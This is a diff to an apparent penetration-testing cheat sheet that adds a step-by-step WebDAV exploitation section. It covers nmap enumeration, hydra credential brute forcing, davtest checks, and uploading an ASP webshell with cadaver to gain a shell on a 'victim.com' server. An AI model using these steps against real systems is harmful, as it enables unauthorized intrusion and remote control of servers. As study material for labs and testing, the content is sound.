@@ -1,6 +1,5 @@
 
 
-
 ## Web App Exploitation
 This probably has a custom developed web application which include some web security flaw which must be identified and exploited. The question is: Which security flaw?
 
@@ -338,6 +337,39 @@ msf6> use auxiliary/scanner/smtp/smtp_enum
 
 ### HTTP (Port 80)
 Refer Web app exploitation
+
+
+
+##### WebDAV Exploitation
+
+Step 1: Find the WebDAV endpoint. It would be something like `/webdav/` and you would need a username and password to log in.
+```
+sudo nmap -script=http-enum $TG -vvv
+```
+
+Step 2: Find the username and password using `hydra`.
+
+Step 3: `DAVtest` will help you check if you can 
+- Create a directory on the server
+- PUT files on the server
+- Execute files on the server (webshell attack path)
+
+```
+davtest -auth <USERNAME>:<PASSWORD> -url http://victim.com/webdav 
+```
+
+Step 4: Run `cadaver` on the server to get a CLI on it.
+```
+cadaver http://example.com/webdav      # This will prompt you for USERNAME and PASSWORD
+dav:/webdav/> ?   # for help
+
+dav:/webdav/> put /usr/share/webshells/asp/webshell.asp 
+Uploading /usr/share/webshells/asp/webshell.asp to `/webdav/webshell.asp':
+Progress: [=============================>] 100.0% of 1362 bytes succeeded.
+```
+
+Step 5: Enjoy your sweet shell @ http://victim.com/webdav/webshell.asp
+
 
 
 ### Kerberos (Port 88)
